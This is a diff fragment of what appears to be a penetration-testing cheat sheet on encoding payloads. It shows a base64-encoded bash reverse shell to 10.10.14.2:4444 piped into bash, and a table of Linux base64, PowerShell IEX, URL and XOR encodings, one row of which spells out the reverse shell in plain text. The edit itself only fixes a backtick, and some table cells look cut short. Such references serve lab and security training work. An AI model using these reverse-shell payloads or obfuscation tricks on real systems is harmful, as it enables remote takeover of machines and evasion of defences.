@@ -330,7 +330,7 @@ echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yLzQ0NDQgMD4mMQ==" | base64 -d | ba
 | Encoding                         | Example                                                                                                   |
 | -------------------------------- | --------------------------------------------------------------------------------------------------------- |
 | **Base64 (Linux)**               | \`echo "payload"                                                                                          |
-| **PowerShell Base64 (UTF-16LE)** | \`echo "IEX..."                                                                                           |
+| **PowerShell Base64 (UTF-16LE)** | \`echo "IEX...\`                                                                                          |
 | **URL Encoding**                 | `python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'))"` |
 | **XOR Encoding (Python)**        | `''.join(chr(ord(c)^0x41) for c in data)`                                                                 |
 
